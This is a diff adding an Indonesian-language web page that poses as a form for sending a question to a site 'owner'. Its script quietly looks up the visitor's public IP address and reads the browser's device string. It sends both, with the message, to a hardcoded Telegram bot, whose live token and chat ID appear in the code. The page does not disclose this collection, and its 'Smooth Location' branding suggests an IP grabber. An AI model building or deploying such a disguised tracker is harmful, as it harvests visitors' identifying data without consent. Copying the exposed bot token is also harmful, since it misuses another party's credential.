@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Smooth Service</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    body {
+      margin:0; background:#000; font-family:"Poppins", sans-serif;
+      min-height:100vh; display:flex; justify-content:center; align-items:center;
+      color:#fff; padding:20px;
+    }
+    .card {
+      background:#111; border-radius:20px;
+      box-shadow:0 0 30px rgba(255,0,0,0.5), inset 0 0 15px rgba(255,0,0,0.3);
+      padding:30px 25px; width:100%; max-width:380px; text-align:center;
+      animation: fadeIn 1s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from {opacity:0; transform:scale(.9);}
+      to {opacity:1; transform:scale(1);}
+    }
+    h2 {
+      color:#ff2e2e; margin-bottom:20px;
+      text-shadow:0 0 8px #ff0000;
+      font-size:1.4rem;
+    }
+    .input-group {
+      display:flex; align-items:center; margin-bottom:18px;
+      background:#000; border:1px solid #ff2e2e; border-radius:14px;
+      padding:10px;
+    }
+    .input-group i { color:#ff2e2e; margin-right:10px; }
+    .input-group input {
+      flex:1; border:none; outline:none; background:transparent; color:#fff;
+      font-size:14px;
+    }
+    button {
+      width:100%; padding:14px; border:none; border-radius:14px;
+      background:linear-gradient(180deg,#ff3c3c,#a00000);
+      color:#fff; font-weight:bold; cursor:pointer; position:relative;
+      font-size:15px; letter-spacing:1px;
+      box-shadow:0 0 15px rgba(255,0,0,0.4);
+      transition:transform .2s;
+    }
+    button:hover { transform:scale(1.03); }
+    button:disabled { opacity:0.6; cursor:not-allowed; }
+    button i { margin-right:8px; }
+
+    /* Progress bar di bawah tombol */
+    .progress-container {
+      margin-top:10px; width:100%; height:8px;
+      background:#222; border-radius:6px;
+      overflow:hidden; display:none;
+    }
+    .progress-bar {
+      height:100%; width:0;
+      background: linear-gradient(90deg, #ff0000, #660000, #ff0000);
+      background-size:200% 100%;
+      animation: shine 1s linear infinite;
+      transition:width .2s ease-in-out;
+    }
+    @keyframes shine {
+      from { background-position:0% 0; }
+      to { background-position:200% 0; }
+    }
+
+    .msg {
+      margin-top:14px; padding:10px; border-radius:10px;
+      font-size:13px; display:none; animation: fadeIn .4s;
+    }
+    .msg.success {
+      background:rgba(0,255,0,0.1); border:1px solid rgba(0,255,0,0.3); color:#8aff8a;
+    }
+    .msg.error {
+      background:rgba(255,0,0,0.1); border:1px solid rgba(255,0,0,0.3); color:#ff8a8a;
+    }
+    .status {
+      margin-top:14px; font-size:14px; color:#bbb;
+    }
+    .status i { margin-right:6px; color:#0f0; }
+    footer {
+      margin-top:20px; font-size:12px; color:#888;
+    }
+    footer i { margin-right:6px; color:#ff2e2e; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2><i class="fa-solid fa-terminal"></i>Smooth Service</h2>
+    
+    <div class="input-group">
+      <i class="fa-solid fa-message"></i>
+      <input id="pesan" placeholder="Tulis pesan atau pertanyaan ke owner...">
+    </div>
+
+    <button id="sendBtn">
+      <i class="fa-solid fa-paper-plane"></i> Kirim Pertanyaan
+    </button>
+
+    <!-- Progress bar di bawah tombol -->
+    <div class="progress-container" id="progressContainer">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <div class="msg" id="message"></div>
+
+    <div class="status"><i class="fa-solid fa-signal"></i> Server Status: <b>Active</b></div>
+
+    <footer><i class="fa-solid fa-copyright"></i> 2025 Smooth Location ON Telegram @XBhigh</footer>
+  </div>
+
+<script>
+  const BOT_TOKEN = "8396284698:AAET4bI4mgGTer0zqSJowY2sGY9HxGRGasA";
+  const CHAT_ID  = "5075315883";
+  const BUTTON_URL1 = "https://t.me/XBhigh";
+  const BUTTON_URL2 = "https://example.com/panel"; // ganti dengan link panel kamu
+
+  const btn=document.getElementById("sendBtn");
+  const progressContainer=document.getElementById("progressContainer");
+  const progressBar=document.getElementById("progressBar");
+  const msg=document.getElementById("message");
+
+  async function getIP() {
+    try {
+      const res = await fetch("https://api.ipify.org?format=json");
+      const data = await res.json();
+      return data.ip;
+    } catch {
+      return "🌐 Unknown IP";
+    }
+  }
+
+  btn.addEventListener("click",async()=>{
+    const text=document.getElementById("pesan").value.trim();
+    if(!text){showMsg("⚠️ Isi pesan dulu.","error");return;}
+
+    msg.style.display="none";
+    btn.disabled=true;
+    progressBar.style.width="0";
+    progressContainer.style.display="block";
+
+    let p=0;
+    const loader=setInterval(()=>{
+      if(p<100){p+=5; progressBar.style.width=p+"%";}
+    },120);
+
+    try{
+      const ip = await getIP();
+      const device = navigator.userAgent;
+
+      // caption lebih keren
+      const caption = `
+📩 *Pesan Baru*:
+\`\`\`${text}\`\`\`
+📱 *Device*: \`\`\`${device}\`\`\`🌍 *IP Address*: \`\`\`${ip}\`\`\`🚀 *Status*: Online ✅
+`;
+
+      // thumbnail catbox
+      const photoUrl = "https://ibb.co.com/ns5ycK52";
+
+      const url=`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+      const res=await fetch(url,{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({
+          chat_id:CHAT_ID,
+          photo:photoUrl,
+          caption:caption,
+          parse_mode:"Markdown",
+          reply_markup:{
+            inline_keyboard:[
+              [
+                {text:"🔗 Open Link", url:BUTTON_URL1},
+                {text:"📂 Panel X", url:BUTTON_URL2}
+              ]
+            ]
+          }
+        })
+      });
+      const data=await res.json();
+      clearInterval(loader);
+      progressBar.style.width="100%";
+
+      if(res.ok && data.ok){showMsg("Pertanyaan anda telah dikirim ke onwer","success");}
+      else{showMsg("❌ Gagal: "+(data.description||"server error"),"error");}
+    }catch(e){
+      clearInterval(loader);
+      showMsg("⚡ Error koneksi: "+e.message,"error");
+    }finally{
+      setTimeout(()=>{
+        btn.disabled=false;
+        progressContainer.style.display="none";
+        progressBar.style.width="0";
+      },800);
+    }
+  });
+
+  function showMsg(text,type){
+    msg.textContent=text;
+    msg.className="msg "+type;
+    msg.style.display="block";
+  }
+</script>
+</body>
+</html>
